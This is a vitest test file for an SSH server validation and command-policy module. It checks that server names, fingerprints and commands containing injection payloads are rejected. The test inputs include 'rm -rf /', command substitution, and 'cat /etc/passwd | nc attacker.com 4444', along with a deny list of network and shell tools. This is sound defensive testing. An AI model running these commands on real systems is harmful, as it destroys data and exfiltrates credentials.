import { describe, it, expect, vi } from "vitest";

vi.mock("server-only", () => ({}));

import {
  sshServerName,
  sshFingerprint,
  createSshServerSchema,
} from "@/lib/ssh/validation";
import { evaluateCommandPolicy } from "@/lib/ssh/policy";

const TEST_UUID = "123e4567-e89b-12d3-a456-426614174000";

describe("SSH Security & Validation Policies", () => {
  describe("Name & Fingerprint Regex Safety", () => {
    it("accepts valid SSH server slugs", () => {
      expect(sshServerName.safeParse("prod-bastion-01").success).toBe(true);
      expect(sshServerName.safeParse("app_server").success).toBe(true);
      expect(sshServerName.safeParse("dev").success).toBe(true);
    });

    it("rejects invalid or injection-prone server names", () => {
      // Must start with a-z
      expect(sshServerName.safeParse("1-server").success).toBe(false);
      expect(sshServerName.safeParse("-invalid").success).toBe(false);
      expect(sshServerName.safeParse("").success).toBe(false);

      // Rejects uppercase and shell metacharacters
      expect(sshServerName.safeParse("ProdServer").success).toBe(false);
      expect(sshServerName.safeParse("server;rm -rf /").success).toBe(false);
      expect(sshServerName.safeParse("server`whoami`").success).toBe(false);
      expect(sshServerName.safeParse("server$PATH").success).toBe(false);
      expect(sshServerName.safeParse("server/subdir").success).toBe(false);
    });

    it("validates RFC 4255 SHA256 base64 host fingerprints", () => {
      const validFp = "SHA256:uT4H4a1Qo/7R9e4k2V1L5P6s7T8u9V0w1X2y3Z4a5b6";
      expect(sshFingerprint.safeParse(validFp).success).toBe(true);

      // Rejects non-SHA256 prefix or malicious injection payload in fingerprint
      expect(sshFingerprint.safeParse("MD5:xx:yy:zz").success).toBe(false);
      expect(
        sshFingerprint.safeParse("SHA256:abc; rm -rf /; echo SHA256:123").success,
      ).toBe(false);
      expect(
        sshFingerprint.safeParse("SHA256:abc\nknown_hosts_poisoning").success,
      ).toBe(false);
    });

    it("enforces schema boundaries on create/update DTOs", () => {
      const validPayload = {
        name: "bastion-1",
        credentialId: TEST_UUID,
        host: "10.0.0.1",
        port: 2222,
        commandAllow: ["^ls", "^uptime"],
        commandDeny: ["rm", "shutdown", "dd"],
      };
      expect(createSshServerSchema.safeParse(validPayload).success).toBe(true);

      // Port out of bounds
      expect(
        createSshServerSchema.safeParse({
          ...validPayload,
          port: 70000,
        }).success,
      ).toBe(false);

      // Invalid UUID
      expect(
        createSshServerSchema.safeParse({
          ...validPayload,
          credentialId: "not-a-uuid",
        }).success,
      ).toBe(false);
    });
  });

  describe("evaluateCommandPolicy — Injection and Bypass Resistance", () => {
    const strictAllow = ["^ls( -[lah]+)?( [a-zA-Z0-9_/.-]+)?$", "^cat [a-zA-Z0-9_/.-]+$"];
    const strictDeny = ["rm", "sudo", "chmod", "curl", "wget", "nc", "bash", "sh", "python", ";", "\\|", "`", "\\$"];

    it("allows valid command matching whitelist regex", () => {
      expect(evaluateCommandPolicy("ls -la /var/log", strictAllow, strictDeny).allowed).toBe(true);
      expect(evaluateCommandPolicy("cat /var/log/syslog", strictAllow, strictDeny).allowed).toBe(true);
    });

    it("blocks chained commands via semicolons, pipes, or backgrounding", () => {
      expect(
        evaluateCommandPolicy("ls; rm -rf /", strictAllow, strictDeny).allowed,
      ).toBe(false);
      expect(
        evaluateCommandPolicy("cat /etc/passwd | nc attacker.com 4444", strictAllow, strictDeny).allowed,
      ).toBe(false);
      expect(
        evaluateCommandPolicy("ls && rm -rf /", strictAllow, strictDeny).allowed,
      ).toBe(false);
    });

    it("blocks command substitution payloads", () => {
      expect(
        evaluateCommandPolicy("cat `whoami`.txt", strictAllow, strictDeny).allowed,
      ).toBe(false);
      expect(
        evaluateCommandPolicy("cat $(whoami).txt", strictAllow, strictDeny).allowed,
      ).toBe(false);
    });

    it("blocks multiline and newline injection attempts", () => {
      expect(
        evaluateCommandPolicy("ls\nrm -rf /", strictAllow, strictDeny).allowed,
      ).toBe(false);
    });
  });
});
